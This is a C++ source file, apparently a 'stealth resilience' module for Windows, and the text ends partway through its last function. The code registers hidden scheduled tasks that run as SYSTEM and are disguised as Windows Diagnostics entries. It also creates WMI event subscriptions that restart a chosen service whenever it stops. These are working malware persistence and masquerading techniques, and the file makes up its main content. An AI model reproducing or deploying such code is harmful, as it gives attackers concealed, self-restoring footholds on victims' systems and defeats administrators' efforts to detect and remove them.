#include "stealth_resilience.h"

#include <taskschd.h>
#include <wbemidl.h>
#include <wrl/client.h>

#include <cwctype>
#include <strsafe.h>
#include <string>
#include <vector>

using Microsoft::WRL::ComPtr;

namespace {

static bool IsNullOrEmpty(const wchar_t* value);

struct ScopedVariant {
    VARIANT value;
    ScopedVariant() {
        VariantInit(&value);
    }
    ~ScopedVariant() {
        VariantClear(&value);
    }
    VARIANT* operator&() { return &value; }
    VARIANT* operator->() { return &value; }
    VARIANT& get() { return value; }
};

struct ScopedBstr {
    BSTR value;
    ScopedBstr() : value(nullptr) {}
    explicit ScopedBstr(const wchar_t* str) : value(nullptr) {
        if (str != nullptr) {
            value = SysAllocString(str);
        }
    }
    ~ScopedBstr() {
        if (value != nullptr) {
            SysFreeString(value);
            value = nullptr;
        }
    }
    BSTR Get() const { return value; }
    bool Allocate(const wchar_t* str) {
        if (value != nullptr) {
            SysFreeString(value);
            value = nullptr;
        }
        if (str == nullptr) {
            return false;
        }
        value = SysAllocString(str);
        return value != nullptr;
    }
};

class ComInitGuard {
public:
    ComInitGuard() : hr_(E_FAIL), initialized_(false) {
        hr_ = CoInitializeEx(nullptr, COINIT_MULTITHREADED);
        if (SUCCEEDED(hr_)) {
            initialized_ = true;
        } else if (hr_ == RPC_E_CHANGED_MODE) {
            hr_ = CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);
            if (SUCCEEDED(hr_) || hr_ == S_FALSE) {
                initialized_ = true;
                hr_ = S_OK;
            }
        } else if (hr_ == S_FALSE) {
            initialized_ = true;
            hr_ = S_OK;
        }
    }
    ~ComInitGuard() {
        if (initialized_) {
            CoUninitialize();
        }
    }
    HRESULT status() const { return hr_; }
private:
    HRESULT hr_;
    bool initialized_;
};

HRESULT EnsureComSecurity() {
    HRESULT hr = CoInitializeSecurity(
        nullptr,
        -1,
        nullptr,
        nullptr,
        RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
        RPC_C_IMP_LEVEL_IMPERSONATE,
        nullptr,
        EOAC_NONE,
        nullptr);
    if (hr == RPC_E_TOO_LATE) {
        hr = S_OK;
    }
    return hr;
}

std::wstring SanitizeName(const wchar_t* source) {
    std::wstring result;
    if (source == nullptr) {
        return result;
    }
    while (*source != L'\0') {
        wchar_t ch = *source++;
        if ((ch >= L'0' && ch <= L'9') ||
            (ch >= L'a' && ch <= L'z') ||
            (ch >= L'A' && ch <= L'Z')) {
            result.push_back(ch);
        } else {
            result.push_back(L'_');
        }
    }
    return result;
}

std::wstring GuidToString(const GUID& guid) {
    wchar_t buffer[64] = {0};
    int chars = StringFromGUID2(guid, buffer, ARRAYSIZE(buffer));
    if (chars <= 0) {
        return L"";
    }
    std::wstring formatted(buffer);
    if (!formatted.empty()) {
        // Remove surrounding braces
        if (formatted.front() == L'{') { formatted.erase(formatted.begin()); }
        if (!formatted.empty() && formatted.back() == L'}') { formatted.pop_back(); }
    }
    return formatted;
}

std::wstring BuildTaskName(const wchar_t* serviceName, const wchar_t* hint, const wchar_t* suffix) {
    GUID guid = {};
    if (FAILED(CoCreateGuid(&guid))) {
        return L"";
    }
    const wchar_t* baseSource = (hint != nullptr && hint[0] != L'\0') ? hint : serviceName;
    std::wstring clean = SanitizeName(baseSource);
    if (clean.empty()) {
        clean = L"Service";
    }
    std::wstring name = clean;
    name.append(L"-");
    name.append(suffix);
    name.append(L"-");
    name.append(GuidToString(guid));
    return name;
}

HRESULT ConnectTaskService(ComPtr<ITaskService>& service) {
    HRESULT hr = CoCreateInstance(
        CLSID_TaskScheduler,
        nullptr,
        CLSCTX_INPROC_SERVER,
        IID_PPV_ARGS(&service));
    if (FAILED(hr)) {
        return hr;
    }

    ScopedVariant empty;
    return service->Connect(empty.get(), empty.get(), empty.get(), empty.get());
}

HRESULT EnsureSubFolder(ITaskFolder* parent, const wchar_t* name, ComPtr<ITaskFolder>& folder) {
    if (parent == nullptr || name == nullptr) {
        return E_POINTER;
    }

    ScopedBstr folderName(name);
    if (folderName.Get() == nullptr) {
        return E_OUTOFMEMORY;
    }

    HRESULT hr = parent->GetFolder(folderName.Get(), &folder);
    if (SUCCEEDED(hr)) {
        return hr;
    }

    ScopedVariant sddl;
    hr = parent->CreateFolder(folderName.Get(), sddl.get(), &folder);
    if (hr == HRESULT_FROM_WIN32(ERROR_ALREADY_EXISTS)) {
        folder = nullptr;
        return parent->GetFolder(folderName.Get(), &folder);
    }
    return hr;
}

HRESULT ResolveDiagnosticsFolder(ITaskService* service, ComPtr<ITaskFolder>& folder) {
    if (service == nullptr) {
        return E_POINTER;
    }

    ComPtr<ITaskFolder> root;
    ScopedBstr rootPath(L"\\");
    HRESULT hr = service->GetFolder(rootPath.Get(), &root);
    if (FAILED(hr)) {
        return hr;
    }

    ComPtr<ITaskFolder> microsoft;
    hr = EnsureSubFolder(root.Get(), L"Microsoft", microsoft);
    if (FAILED(hr)) {
        return hr;
    }
    ComPtr<ITaskFolder> windows;
    hr = EnsureSubFolder(microsoft.Get(), L"Windows", windows);
    if (FAILED(hr)) {
        return hr;
    }
    return EnsureSubFolder(windows.Get(), L"Diagnostics", folder);
}

HRESULT PrepareTaskDefinition(ITaskService* service, BOOL hidden, ComPtr<ITaskDefinition>& definition) {
    if (service == nullptr) {
        return E_POINTER;
    }

    HRESULT hr = service->NewTask(0, &definition);
    if (FAILED(hr)) {
        return hr;
    }

    ComPtr<IRegistrationInfo> regInfo;
    hr = definition->get_RegistrationInfo(&regInfo);
    if (SUCCEEDED(hr) && regInfo) {
        ScopedBstr author(L"Windows Diagnostics");
        regInfo->put_Author(author.Get());
        ScopedBstr source(L"WinDiagnosticHost");
        regInfo->put_Source(source.Get());
    }

    ComPtr<IPrincipal> principal;
    hr = definition->get_Principal(&principal);
    if (SUCCEEDED(hr) && principal) {
        principal->put_LogonType(TASK_LOGON_SERVICE_ACCOUNT);
        principal->put_RunLevel(TASK_RUNLEVEL_HIGHEST);
        ScopedBstr user(L"NT AUTHORITY\\SYSTEM");
        principal->put_UserId(user.Get());
    }

    ComPtr<ITaskSettings> settings;
    hr = definition->get_Settings(&settings);
    if (SUCCEEDED(hr) && settings) {
        settings->put_Hidden(hidden ? VARIANT_TRUE : VARIANT_FALSE);
        settings->put_DisallowStartIfOnBatteries(VARIANT_FALSE);
        settings->put_StopIfGoingOnBatteries(VARIANT_FALSE);
        settings->put_StartWhenAvailable(VARIANT_TRUE);
        settings->put_AllowHardTerminate(VARIANT_TRUE);
        settings->put_MultipleInstances(TASK_INSTANCES_IGNORE_NEW);
    }

    return S_OK;
}

HRESULT RegisterTaskDefinition(
    ITaskFolder* folder,
    const std::wstring& taskName,
    ITaskDefinition* definition,
    std::wstring* fullPath) {

    if (folder == nullptr || definition == nullptr) {
        return E_POINTER;
    }

    ScopedBstr nameBstr(taskName.c_str());
    if (nameBstr.Get() == nullptr) {
        return E_OUTOFMEMORY;
    }

    ScopedVariant user;
    user.get().vt = VT_BSTR;
    user.get().bstrVal = SysAllocString(L"NT AUTHORITY\\SYSTEM");
    if (user.get().bstrVal == nullptr) {
        return E_OUTOFMEMORY;
    }

    ScopedVariant empty;
    ComPtr<IRegisteredTask> registered;
    HRESULT hr = folder->RegisterTaskDefinition(
        nameBstr.Get(),
        definition,
        TASK_CREATE_OR_UPDATE,
        user.get(),
        empty.get(),
        TASK_LOGON_SERVICE_ACCOUNT,
        empty.get(),
        &registered);
    if (FAILED(hr)) {
        return hr;
    }

    if (fullPath != nullptr) {
        *fullPath = L"\\Microsoft\\Windows\\Diagnostics\\";
        fullPath->append(taskName);
    }

    return S_OK;
}

static bool SplitTaskFullPath(const wchar_t* fullPath, std::wstring& folderPath, std::wstring& taskName)
{
    if (IsNullOrEmpty(fullPath)) {
        return false;
    }

    std::wstring normalized = fullPath;
    if (normalized.front() != L'\\') {
        normalized.insert(normalized.begin(), L'\\');
    }

    size_t pos = normalized.find_last_of(L'\\');
    if (pos == std::wstring::npos || pos == normalized.length() - 1) {
        return false;
    }

    folderPath = normalized.substr(0, pos);
    if (folderPath.empty()) {
        folderPath = L"\\";
    }
    taskName = normalized.substr(pos + 1);
    return !taskName.empty();
}

std::wstring BuildEventXPath(const wchar_t* serviceName) {
    if (serviceName == nullptr) {
        return L"";
    }
    wchar_t buffer[1024];
    _snwprintf_s(
        buffer,
        _countof(buffer),
        _TRUNCATE,
        L"<QueryList>"
        L"<Query Id=\"0\" Path=\"System\">"
        L"<Select Path=\"System\">"
        L"*[System[Provider[@Name='Service Control Manager'] and EventID=7036]] and "
        L"*[EventData[Data='%ls'] and EventData[Data='stopped']]"
        L"</Select>"
        L"</Query>"
        L"</QueryList>",
        serviceName);
    return std::wstring(buffer);
}

static bool IsNullOrEmpty(const wchar_t* value) {
    return (value == nullptr || value[0] == L'\0');
}

std::wstring NormalizeNamespace(const wchar_t* ns) {
    if (ns == nullptr) {
        return L"root\\subscription";
    }
    std::wstring normalized = ns;
    for (auto& ch : normalized) {
        if (ch == L'/') {
            ch = L'\\';
        }
    }
    if (normalized.empty()) {
        normalized = L"root\\subscription";
    }
    return normalized;
}

HRESULT ConnectWmi(const std::wstring& ns, ComPtr<IWbemServices>& services) {
    ComPtr<IWbemLocator> locator;
    HRESULT hr = CoCreateInstance(
        CLSID_WbemLocator,
        nullptr,
        CLSCTX_INPROC_SERVER,
        IID_PPV_ARGS(&locator));
    if (FAILED(hr)) {
        return hr;
    }

    ScopedBstr namespaceBstr(ns.c_str());
    if (namespaceBstr.Get() == nullptr) {
        return E_OUTOFMEMORY;
    }

    hr = locator->ConnectServer(
        namespaceBstr.Get(),
        nullptr,
        nullptr,
        nullptr,
        0,
        nullptr,
        nullptr,
        &services);
    if (FAILED(hr)) {
        return hr;
    }

    hr = CoSetProxyBlanket(
        services.Get(),
        RPC_C_AUTHN_WINNT,
        RPC_C_AUTHZ_NONE,
        nullptr,
        RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
        RPC_C_IMP_LEVEL_IMPERSONATE,
        nullptr,
        EOAC_NONE);
    return hr;
}

std::wstring EscapeWmiName(const std::wstring& name) {
    std::wstring escaped;
    escaped.reserve(name.size());
    for (wchar_t ch : name) {
        if (ch == L'\"' || ch == L'\\') {
            escaped.push_back(L'\\');
        }
        escaped.push_back(ch);
    }
    return escaped;
}

HRESULT PutStringProperty(IWbemClassObject* instance, const wchar_t* propertyName, const std::wstring& value) {
    if (instance == nullptr || propertyName == nullptr) {
        return E_POINTER;
    }
    ScopedVariant var;
    var.get().vt = VT_BSTR;
    var.get().bstrVal = SysAllocString(value.c_str());
    if (var.get().bstrVal == nullptr) {
        return E_OUTOFMEMORY;
    }
    return instance->Put(propertyName, 0, &var.get(), 0);
}

HRESULT CreateWmiInstance(
    IWbemServices* services,
    const wchar_t* className,
    IWbemClassObject** instance) {
    if (services == nullptr || className == nullptr || instance == nullptr) {
        return E_POINTER;
    }
    ScopedBstr classBstr(className);
    if (classBstr.Get() == nullptr) {
        return E_OUTOFMEMORY;
    }
    ComPtr<IWbemClassObject> cls;
    HRESULT hr = services->GetObject(classBstr.Get(), 0, nullptr, &cls, nullptr);
    if (FAILED(hr)) {
        return hr;
    }
    return cls->SpawnInstance(0, instance);
}

HRESULT DeleteWmiInstance(IWbemServices* services, const std::wstring& path) {
    if (services == nullptr) {
        return E_POINTER;
    }
    ScopedBstr pathBstr(path.c_str());
    if (pathBstr.Get() == nullptr) {
        return E_OUTOFMEMORY;
    }
    return services->DeleteInstance(pathBstr.Get(), 0, nullptr, nullptr);
}

} // namespace

BOOL StealthResilience_CreateAutorunTask(
    const wchar_t* serviceName,
    const wchar_t* taskHint,
    const wchar_t* triggerKeyword,
    BOOL hidden,
    wchar_t* createdTaskPath,
    size_t createdTaskPathCch) {

    if (IsNullOrEmpty(serviceName) || createdTaskPath == nullptr || createdTaskPathCch == 0) {
        return FALSE;
    }
    createdTaskPath[0] = L'\0';

    ComInitGuard guard;
    if (FAILED(guard.status()) || FAILED(EnsureComSecurity())) {
        return FALSE;
    }

    ComPtr<ITaskService> service;
    if (FAILED(ConnectTaskService(service))) {
        return FALSE;
    }

    ComPtr<ITaskFolder> diagnosticsFolder;
    if (FAILED(ResolveDiagnosticsFolder(service.Get(), diagnosticsFolder))) {
        return FALSE;
    }

    ComPtr<ITaskDefinition> definition;
    if (FAILED(PrepareTaskDefinition(service.Get(), hidden, definition))) {
        return FALSE;
    }

    // Configure trigger
    ComPtr<ITriggerCollection> triggers;
    if (FAILED(definition->get_Triggers(&triggers))) {
        return FALSE;
    }

    TASK_TRIGGER_TYPE2 triggerType = TASK_TRIGGER_LOGON;
    if (!IsNullOrEmpty(triggerKeyword)) {
        if (_wcsicmp(triggerKeyword, L"ONBOOT") == 0 || _wcsicmp(triggerKeyword, L"ONSTART") == 0) {
            triggerType = TASK_TRIGGER_BOOT;
        }
    }

    ComPtr<ITrigger> trigger;
    if (FAILED(triggers->Create(triggerType, &trigger))) {
        return FALSE;
    }

    if (triggerType == TASK_TRIGGER_LOGON) {
        ComPtr<ILogonTrigger> logon;
        if (SUCCEEDED(trigger.As(&logon)) && logon) {
            ScopedBstr systemUser(L"SYSTEM");
            if (systemUser.Get() == nullptr || FAILED(logon->put_UserId(systemUser.Get()))) {
                return FALSE;
            }
        }
    }

    // Configure action
    ComPtr<IActionCollection> actions;
    if (FAILED(definition->get_Actions(&actions))) {
        return FALSE;
    }
    ComPtr<IAction> action;
    if (FAILED(actions->Create(TASK_ACTION_EXEC, &action))) {
        return FALSE;
    }
    ComPtr<IExecAction> exec;
    if (FAILED(action.As(&exec))) {
        return FALSE;
    }

    wchar_t systemDir[MAX_PATH] = {0};
    if (GetSystemDirectoryW(systemDir, ARRAYSIZE(systemDir)) == 0) {
        return FALSE;
    }

    wchar_t scPath[MAX_PATH] = {0};
    if (FAILED(StringCchPrintfW(scPath, ARRAYSIZE(scPath), L"%s\\sc.exe", systemDir))) {
        return FALSE;
    }
    if (FAILED(exec->put_Path(scPath))) {
        return FALSE;
    }

    wchar_t arguments[512] = {0};
    if (FAILED(StringCchPrintfW(arguments, ARRAYSIZE(arguments), L"start %ls", serviceName))) {
        return FALSE;
    }
    if (FAILED(exec->put_Arguments(arguments))) {
        return FALSE;
    }

    std::wstring taskName = BuildTaskName(serviceName, taskHint, L"Autorun");
    if (taskName.empty()) {
        return FALSE;
    }

    std::wstring fullPath;
    if (FAILED(RegisterTaskDefinition(diagnosticsFolder.Get(), taskName, definition.Get(), &fullPath))) {
        return FALSE;
    }

    wcsncpy_s(createdTaskPath, createdTaskPathCch, fullPath.c_str(), _TRUNCATE);
    return TRUE;
}

BOOL StealthResilience_CreateRestartTask(
    const wchar_t* serviceName,
    const wchar_t* taskHint,
    const wchar_t* eventXPath,
    BOOL hidden,
    wchar_t* createdTaskPath,
    size_t createdTaskPathCch) {

    if (IsNullOrEmpty(serviceName) || createdTaskPath == nullptr || createdTaskPathCch == 0) {
        return FALSE;
    }
    createdTaskPath[0] = L'\0';

    std::wstring xPath = IsNullOrEmpty(eventXPath) ? BuildEventXPath(serviceName) : std::wstring(eventXPath);
    if (xPath.empty()) {
        return FALSE;
    }

    ComInitGuard guard;
    if (FAILED(guard.status()) || FAILED(EnsureComSecurity())) {
        return FALSE;
    }

    ComPtr<ITaskService> service;
    if (FAILED(ConnectTaskService(service))) {
        return FALSE;
    }

    ComPtr<ITaskFolder> diagnosticsFolder;
    if (FAILED(ResolveDiagnosticsFolder(service.Get(), diagnosticsFolder))) {
        return FALSE;
    }

    ComPtr<ITaskDefinition> definition;
    if (FAILED(PrepareTaskDefinition(service.Get(), hidden, definition))) {
        return FALSE;
    }

    ComPtr<ITriggerCollection> triggers;
    if (FAILED(definition->get_Triggers(&triggers))) {
        return FALSE;
    }

    ComPtr<ITrigger> trigger;
    if (FAILED(triggers->Create(TASK_TRIGGER_EVENT, &trigger))) {
        return FALSE;
    }

    ComPtr<IEventTrigger> eventTrigger;
    if (FAILED(trigger.As(&eventTrigger))) {
        return FALSE;
    }
    ScopedBstr subscription(xPath.c_str());
    if (subscription.Get() == nullptr) {
        return FALSE;
    }
    eventTrigger->put_Subscription(subscription.Get());
    eventTrigger->put_Enabled(VARIANT_TRUE);

    ComPtr<IActionCollection> actions;
    if (FAILED(definition->get_Actions(&actions))) {
        return FALSE;
    }
    ComPtr<IAction> action;
    if (FAILED(actions->Create(TASK_ACTION_EXEC, &action))) {
        return FALSE;
    }
    ComPtr<IExecAction> exec;
    if (FAILED(action.As(&exec))) {
        return FALSE;
    }

    wchar_t systemDir[MAX_PATH] = {0};
    if (GetSystemDirectoryW(systemDir, ARRAYSIZE(systemDir)) == 0) {
        return FALSE;
    }

    wchar_t scPath[MAX_PATH] = {0};
    if (FAILED(StringCchPrintfW(scPath, ARRAYSIZE(scPath), L"%s\\sc.exe", systemDir))) {
        return FALSE;
    }
    if (FAILED(exec->put_Path(scPath))) {
        return FALSE;
    }

    wchar_t arguments[512] = {0};
    if (FAILED(StringCchPrintfW(arguments, ARRAYSIZE(arguments), L"start %ls", serviceName))) {
        return FALSE;
    }
    if (FAILED(exec->put_Arguments(arguments))) {
        return FALSE;
    }

    std::wstring taskName = BuildTaskName(serviceName, taskHint, L"RestartOnStop");
    if (taskName.empty()) {
        return FALSE;
    }

    std::wstring fullPath;
    if (FAILED(RegisterTaskDefinition(diagnosticsFolder.Get(), taskName, definition.Get(), &fullPath))) {
        return FALSE;
    }

    wcsncpy_s(createdTaskPath, createdTaskPathCch, fullPath.c_str(), _TRUNCATE);
    return TRUE;
}

BOOL StealthResilience_DeleteTask(const wchar_t* taskPath) {
    if (IsNullOrEmpty(taskPath)) {
        return FALSE;
    }

    const wchar_t* relative = taskPath;
    const wchar_t* needle = wcsrchr(taskPath, L'\\');
    if (needle != nullptr) {
        relative = needle + 1;
    }
    if (IsNullOrEmpty(relative)) {
        return FALSE;
    }

    ComInitGuard guard;
    if (FAILED(guard.status()) || FAILED(EnsureComSecurity())) {
        return FALSE;
    }

    ComPtr<ITaskService> service;
    if (FAILED(ConnectTaskService(service))) {
        return FALSE;
    }

    ComPtr<ITaskFolder> diagnosticsFolder;
    if (FAILED(ResolveDiagnosticsFolder(service.Get(), diagnosticsFolder))) {
        return FALSE;
    }

    ScopedBstr name(relative);
    if (name.Get() == nullptr) {
        return FALSE;
    }

    HRESULT hr = diagnosticsFolder->DeleteTask(name.Get(), 0);
    if (FAILED(hr) && hr != HRESULT_FROM_WIN32(ERROR_FILE_NOT_FOUND)) {
        return FALSE;
    }
    return TRUE;
}

BOOL StealthResilience_DeleteTasksByPrefix(
    const wchar_t* servicePrefix,
    const wchar_t* token,
    DWORD* removedCount) {

    if (IsNullOrEmpty(servicePrefix)) {
        return FALSE;
    }

    std::wstring prefixLower = servicePrefix;
    for (auto& ch : prefixLower) {
        ch = towlower(ch);
    }

    std::wstring tokenLower;
    if (!IsNullOrEmpty(token)) {
        tokenLower = token;
        for (auto& ch : tokenLower) {
            ch = towlower(ch);
        }
    }

    ComInitGuard guard;
    if (FAILED(guard.status()) || FAILED(EnsureComSecurity())) {
        return FALSE;
    }

    ComPtr<ITaskService> service;
    if (FAILED(ConnectTaskService(service))) {
        return FALSE;
    }

    ComPtr<ITaskFolder> diagnosticsFolder;
    if (FAILED(ResolveDiagnosticsFolder(service.Get(), diagnosticsFolder))) {
        return FALSE;
    }

    ComPtr<IRegisteredTaskCollection> tasks;
    if (FAILED(diagnosticsFolder->GetTasks(TASK_ENUM_HIDDEN, &tasks))) {
        return FALSE;
    }

    LONG count = 0;
    tasks->get_Count(&count);
    std::vector<std::wstring> matches;
    matches.reserve(count > 0 ? static_cast<size_t>(count) : 0);

    for (LONG i = 0; i < count; ++i) {
        ComPtr<IRegisteredTask> task;
        VARIANT idx;
        VariantInit(&idx);
        idx.vt = VT_I4;
        idx.lVal = i + 1;
        if (FAILED(tasks->get_Item(idx, &task)) || !task) {
            continue;
        }
        ScopedBstr nameBstr;
        if (FAILED(task->get_Name(&nameBstr.value)) || nameBstr.Get() == nullptr) {
            continue;
        }
        std::wstring nameLower = nameBstr.Get();
        for (auto& ch : nameLower) {
            ch = towlower(ch);
        }
        if (nameLower.find(prefixLower) == std::wstring::npos) {
            continue;
        }
        if (!tokenLower.empty() && nameLower.find(tokenLower) == std::wstring::npos) {
            continue;
        }
        matches.push_back(nameBstr.Get());
    }

    DWORD deleted = 0;
    for (const auto& name : matches) {
        ScopedBstr taskName(name.c_str());
        if (taskName.Get() == nullptr) {
            continue;
        }
        if (SUCCEEDED(diagnosticsFolder->DeleteTask(taskName.Get(), 0))) {
            ++deleted;
        }
    }

    if (removedCount) {
        *removedCount = deleted;
    }
    return TRUE;
}

BOOL StealthResilience_TaskExists(const wchar_t* taskPath)
{
    if (IsNullOrEmpty(taskPath)) {
        return FALSE;
    }

    std::wstring folderPath;
    std::wstring taskName;
    if (!SplitTaskFullPath(taskPath, folderPath, taskName)) {
        return FALSE;
    }

    ComInitGuard guard;
    if (FAILED(guard.status()) || FAILED(EnsureComSecurity())) {
        return FALSE;
    }

    ComPtr<ITaskService> service;
    if (FAILED(ConnectTaskService(service))) {
        return FALSE;
    }

    ScopedBstr folderBstr(folderPath.c_str());
    if (folderBstr.Get() == nullptr) {
        return FALSE;
    }

    ComPtr<ITaskFolder> folder;
    if (FAILED(service->GetFolder(folderBstr.Get(), &folder))) {
        return FALSE;
    }

    ScopedBstr taskBstr(taskName.c_str());
    if (taskBstr.Get() == nullptr) {
        return FALSE;
    }

    ComPtr<IRegisteredTask> task;
    HRESULT hr = folder->GetTask(taskBstr.Get(), &task);
    return SUCCEEDED(hr) && task != nullptr;
}

BOOL StealthResilience_FindTaskByPrefix(
    const wchar_t* taskPrefix,
    const wchar_t* token,
    wchar_t* outTaskPath,
    size_t outTaskPathCch)
{
    if (outTaskPath == nullptr || outTaskPathCch == 0) {
        return FALSE;
    }
    outTaskPath[0] = L'\0';

    if (IsNullOrEmpty(taskPrefix)) {
        return FALSE;
    }

    std::wstring prefixLower = taskPrefix;
    for (auto& ch : prefixLower) {
        ch = towlower(ch);
    }

    std::wstring tokenLower;
    if (!IsNullOrEmpty(token)) {
        tokenLower = token;
        for (auto& ch : tokenLower) {
            ch = towlower(ch);
        }
    }

    ComInitGuard guard;
    if (FAILED(guard.status()) || FAILED(EnsureComSecurity())) {
        return FALSE;
    }

    ComPtr<ITaskService> service;
    if (FAILED(ConnectTaskService(service))) {
        return FALSE;
    }

    ComPtr<ITaskFolder> diagnosticsFolder;
    if (FAILED(ResolveDiagnosticsFolder(service.Get(), diagnosticsFolder))) {
        return FALSE;
    }

    ComPtr<IRegisteredTaskCollection> tasks;
    if (FAILED(diagnosticsFolder->GetTasks(TASK_ENUM_HIDDEN, &tasks))) {
        return FALSE;
    }

    LONG count = 0;
    tasks->get_Count(&count);

    for (LONG i = 0; i < count; ++i) {
        ComPtr<IRegisteredTask> task;
        VARIANT idx;
        VariantInit(&idx);
        idx.vt = VT_I4;
        idx.lVal = i + 1;
        if (FAILED(tasks->get_Item(idx, &task)) || !task) {
            continue;
        }

        ScopedBstr nameBstr;
        if (FAILED(task->get_Name(&nameBstr.value)) || nameBstr.Get() == nullptr) {
            continue;
        }

        std::wstring nameLower = nameBstr.Get();
        for (auto& ch : nameLower) {
            ch = towlower(ch);
        }

        if (nameLower.find(prefixLower) == std::wstring::npos) {
            continue;
        }
        if (!tokenLower.empty() &&
            nameLower.find(tokenLower) == std::wstring::npos) {
            continue;
        }

        std::wstring fullPath = L"\\Microsoft\\Windows\\Diagnostics\\";
        fullPath.append(nameBstr.Get());
        wcsncpy_s(outTaskPath, outTaskPathCch, fullPath.c_str(), _TRUNCATE);
        return TRUE;
    }

    return FALSE;
}

BOOL StealthResilience_CreateWmiRestartSubscription(
    const wchar_t* serviceName,
    const wchar_t* methodClass,
    const wchar_t* methodName,
    const wchar_t* namespacePath,
    wchar_t* outFilterName,
    size_t filterNameCch,
    wchar_t* outConsumerName,
    size_t consumerNameCch) {

    if (IsNullOrEmpty(serviceName) ||
        outFilterName == nullptr || filterNameCch == 0 ||
        outConsumerName == nullptr || consumerNameCch == 0) {
        return FALSE;
    }
    outFilterName[0] = L'\0';
    outConsumerName[0] = L'\0';

    ComInitGuard guard;
    if (FAILED(guard.status()) || FAILED(EnsureComSecurity())) {
        return FALSE;
    }

    std::wstring ns = NormalizeNamespace(namespacePath);
    ComPtr<IWbemServices> services;
    if (FAILED(ConnectWmi(ns, services))) {
        return FALSE;
    }

    std::wstring base = SanitizeName(methodClass);
    if (base.empty()) {
        base = SanitizeName(serviceName);
        if (base.empty()) {
            base = L"DiagHost";
        }
    }

    GUID guid = {};
    if (FAILED(CoCreateGuid(&guid))) {
        return FALSE;
    }

    std::wstring guidStr = GuidToString(guid);
    std::wstring filterName = base + L"_StopFilter_" + guidStr;
    std::wstring consumerName = base + L"_RestartConsumer_" + guidStr;

    ComPtr<IWbemClassObject> filter;
    if (FAILED(CreateWmiInstance(services.Get(), L"__EventFilter", &filter))) {
        return FALSE;
    }

    std::wstring query = L"SELECT * FROM __InstanceModificationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_Service' AND TargetInstance.Name='";
    query.append(serviceName);
    query.append(L"' AND TargetInstance.State='Stopped'");

    if (FAILED(PutStringProperty(filter.Get(), L"Name", filterName))) {
        return FALSE;
    }
    if (FAILED(PutStringProperty(filter.Get(), L"QueryLanguage", L"WQL"))) {
        return FALSE;
    }
    if (FAILED(PutStringProperty(filter.Get(), L"Query", query))) {
        return FALSE;
    }
    if (FAILED(PutStringProperty(filter.Get(), L"EventNamespace", L"root\\cimv2"))) {
        return FALSE;
    }

    if (FAILED(services->PutInstance(filter.Get(), WBEM_FLAG_CREATE_OR_UPDATE, nullptr, nullptr))) {
        return FALSE;
    }

    ComPtr<IWbemClassObject> consumer;
    if (FAILED(CreateWmiInstance(services.Get(), L"CommandLineEventConsumer", &consumer))) {
        DeleteWmiInstance(services.Get(), L"__EventFilter.Name=\"" + EscapeWmiName(filterName) + L"\"");
        return FALSE;
    }

    wchar_t systemDir[MAX_PATH] = {0};
    if (GetSystemDirectoryW(systemDir, ARRAYSIZE(systemDir)) == 0) {
        DeleteWmiInstance(services.Get(), L"__EventFilter.Name=\"" + EscapeWmiName(filterName) + L"\"");
        return FALSE;
    }

    wchar_t commandLine[512] = {0};
    if (FAILED(StringCchPrintfW(commandLine, ARRAYSIZE(commandLine), L"%ls\\sc.exe start %ls", systemDir, serviceName))) {
        DeleteWmiInstance(services.Get(), L"__EventFilter.Name=\"" + EscapeWmiName(filterName) + L"\"");
        return FALSE;
    }

    if (FAILED(PutStringProperty(consumer.Get(), L"Name", consumerName)) ||
        FAILED(PutStringProperty(consumer.Get(), L"CommandLineTemplate", commandLine))) {
        DeleteWmiInstance(services.Get(), L"__EventFilter.Name=\"" + EscapeWmiName(filterName) + L"\"");
        return FALSE;
    }
    ScopedVariant runInteractive;
    runInteractive->vt = VT_BOOL;
    runInteractive->boolVal = VARIANT_FALSE;
    consumer->Put(L"RunInteractively", 0, &runInteractive.get(), 0);

    if (FAILED(services->PutInstance(consumer.Get(), WBEM_FLAG_CREATE_OR_UPDATE, nullptr, nullptr))) {
        DeleteWmiInstance(services.Get(), L"__EventFilter.Name=\"" + EscapeWmiName(filterName) + L"\"");
        return FALSE;
    }

    // Bind filter to consumer
    ComPtr<IWbemClassObject> binding;
    if (FAILED(CreateWmiInstance(services.Get(), L"__FilterToConsumerBinding", &binding))) {
        DeleteWmiInstance(services.Get(), L"CommandLineEventConsumer.Name=\"" + EscapeWmiName(consumerName) + L"\"");
        DeleteWmiInstance(services.Get(), L"__EventFilter.Name=\"" + EscapeWmiName(filterName) + L"\"");
        return FALSE;
    }

    std::wstring filterPath = L"__EventFilter.Name=\"" + EscapeWmiName(filterName) + L"\"";
    std::wstring consumerPath = L"CommandLineEventConsumer.Name=\"" + EscapeWmiName(consumerName) + L"\"";

    if (FAILED(PutStringProperty(binding.Get(), L"Filter", filterPath)) ||
        FAILED(PutStringProperty(binding.Get(), L"Consumer", consumerPath))) {
        DeleteWmiInstance(services.Get(), consumerPath);
        DeleteWmiInstance(services.Get(), filterPath);
        return FALSE;
    }

    if (FAILED(services->PutInstance(binding.Get(), WBEM_FLAG_CREATE_OR_UPDATE, nullptr, nullptr))) {
        DeleteWmiInstance(services.Get(), consumerPath);
        DeleteWmiInstance(services.Get(), filterPath);
        return FALSE;
    }

    wcsncpy_s(outFilterName, filterNameCch, filterName.c_str(), _TRUNCATE);
    wcsncpy_s(outConsumerName, consumerNameCch, consumerName.c_str(), _TRUNCATE);
    return TRUE;
}

BOOL StealthResilience_RemoveWmiSubscription(
    const wchar_t* filterName,
    const wchar_t* consumerName) {

    if (IsNullOrEmpty(filterName) && IsNullOrEmpty(consumerName)) {
        return TRUE;
    }

    ComInitGuard guard;
    if (FAILED(guard.status()) || FAILED(EnsureComSecurity())) {
        return FALSE;
    }

    ComPtr<IWbemServices> services;
    if (FAILED(ConnectWmi(NormalizeNamespace(L"root\\subscription"), services))) {
        return FALSE;
    }

    if (!IsNullOrEmpty(filterName)) {
        std::wstring filterPath = L"__EventFilter.Name=\"" + EscapeWmiName(filterName) + L"\"";
        DeleteWmiInstance(services.Get(), filterPath);
    }
    if (!IsNullOrEmpty(consumerName)) {
        std::wstring consumerPath = L"CommandLineEventConsumer.Name=\"" + EscapeWmiName(consumerName) + L"\"";
        DeleteWmiInstance(services.Get(), consumerPath);
    }

    return TRUE;
}

BOOL StealthResilience_RemoveWmiSubscriptionsByPrefix(
    const wchar_t* filterPrefix,
    const wchar_t* consumerPrefix,
    DWORD* removedFilters,
    DWORD* removedConsumers) {

    ComInitGuard guard;
    if (FAILED(guard.status()) || FAILED(EnsureComSecurity())) {
